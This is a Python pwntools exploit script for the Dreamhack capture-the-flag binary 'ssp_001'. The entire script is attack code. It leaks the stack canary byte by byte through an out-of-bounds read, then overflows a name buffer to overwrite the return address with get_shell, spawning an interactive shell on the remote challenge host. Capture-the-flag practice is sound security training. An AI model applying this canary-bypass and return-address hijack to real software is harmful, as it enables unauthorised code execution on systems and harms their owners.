#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.binary = elf = ELF('./ssp_001', checksec=False)

#libc = ELF('', checksec=False)
libc = elf.libc

gs = """
b *main
b *main+179
b *main+239
b *main+308
"""

info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
sla = lambda msg, data: io.sendlineafter(msg, data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
s = lambda data: io.send(data)

def start():
    if args.GDB:
        return gdb.debug(elf.path, env={"LD_PRELOAD": libc.path},gdbscript=gs)
    elif args.REMOTE:
        return remote('host3.dreamhack.games', 13393)
    else:
        return process(elf.path, env={"LD_LIBRARY_PATH": libc.path})

def fill_box(data):
    sl(b'F')
    sla(b'box input : ', data)
    io.recvuntil(b'> ')
    
def print_box(index):
    sl(b'P')
    sla(b'Element index : ', str(index).encode())
    io.recvuntil(f'Element of index {index} is : '.encode())
    num = int(io.recvn(2), 16)
    io.recvuntil(b'> ')
    return num

def exit_box(size_name, name):
    sl(b'E')
    sla(b'Name Size : ', str(size_name).encode())
    sla(b'Name : ', name)

def leak_offset(index):
    num = 0
    for i in range (4):
        num += print_box(index + i) << (8 * i)
    return num

get_shell = p32(elf.sym['get_shell'])
padding_canary_box = 0x80
padding_ret_name = 0x4c
padding_canary_name = 0x40
io = start()
io.recvuntil(b'> ')

canary = leak_offset(padding_canary_box)
success(f"canary @ {hex(canary)}")

payload = b'a' * padding_canary_name + p32(canary) + b'a' * (padding_ret_name - padding_canary_name - 4) + get_shell 
exit_box(len(payload), payload)
io.interactive()